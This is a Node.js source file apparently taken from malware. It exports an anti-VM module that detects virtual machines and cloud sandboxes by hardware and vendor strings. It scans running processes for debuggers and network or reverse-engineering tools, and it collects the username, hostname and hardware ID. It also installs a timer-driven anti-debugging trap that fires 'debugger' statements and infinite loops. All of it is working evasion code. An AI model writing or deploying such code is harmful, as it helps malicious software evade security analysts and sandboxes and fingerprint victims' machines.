"use strict";

const child_process = require("child_process");
const os = require("os");

class AntiVM {
    static async checkAll() {
        return this.checkHardware() || this.checkAdvancedVM() || (await this.checkProcesses());
    }

    static checkHardware() {
        const cpus = os.cpus();
        const totalMemory = os.totalmem();
        const cpuModel = cpus[0].model.toLowerCase();

        const lowResources = cpus.length < 2 || totalMemory < 4294967296;
        const knownVMModels = ["virtual", "vbox", "vmware", "qemu", "hyper-v", "xen"].some(vm => cpuModel.includes(vm));

        return lowResources || knownVMModels;
    }

    static checkAdvancedVM() {
        try {
            const boardInfo = child_process.execSync("wmic baseboard get manufacturer,product").toString().toLowerCase();
            const enclosureInfo = child_process.execSync("wmic systemenclosure get manufacturer").toString().toLowerCase();
            const vmVendors = [
                "microsoft corporation", 
                "vmware", 
                "oracle", 
                "xen", 
                "proxmox", 
                "amazon ec2", 
                "google", 
                "alibaba"
            ];

            return vmVendors.some(vendor => boardInfo.includes(vendor) || enclosureInfo.includes(vendor));
        } catch (err) {
            return false;
        }
    }

    static async checkProcesses() {
        return new Promise(resolve => {
            try {
                const analysisTools = [
                    "wireshark", "tcpdump", "tshark", "process monitor", "procmon", "procexp",
                    "ollydbg", "x64dbg", "x32dbg", "ida pro", "ida64", "ida32", "immunity",
                    "radare2", "ghidra", "binary ninja", "cheat engine", "fiddler", "burp suite",
                    "owasp zap", "curl.exe", "resource hacker", "pestudio", "cff explorer",
                    "dependency walker", "hexeditor", "die", "process hacker", "apimonitor",
                    "detours", "easyhook", "madchook"
                ];

                const taskList = child_process.execSync("tasklist").toString().toLowerCase();
                resolve(analysisTools.some(tool => taskList.includes(tool)));
            } catch (err) {
                resolve(false);
            }
        });
    }

    static getMachineDetails() {
        return {
            username: os.userInfo().username,
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            cpus: os.cpus()[0].model,
            hwid: child_process.execSync("wmic csproduct get uuid").toString().split("\n")[1].trim()
        };
    }
}

function antiAnalysisTrap(counter) {
    function trap(val) {
        if (typeof val === "string") {
            return function(h) {}.constructor("while (true) {}").apply("counter");
        } else if (("" + val / val).length !== 1 || val % 20 === 0) {
            (function() { return true; }).constructor("debugger").call("action");
        } else {
            (function() { return false; }).constructor("debugger").apply("stateObject");
        }
        trap(++val);
    }

    try {
        if (counter) {
            return trap;
        } else {
            trap(0);
        }
    } catch (e) {}
}

(function() {
    let globalScope;
    try {
        globalScope = Function('return (function() {}.constructor("return this")( ));')();
    } catch (e) {
        globalScope = window;
    }
    globalScope.setInterval(antiAnalysisTrap, 4000);
})();

exports.AntiVM = AntiVM;
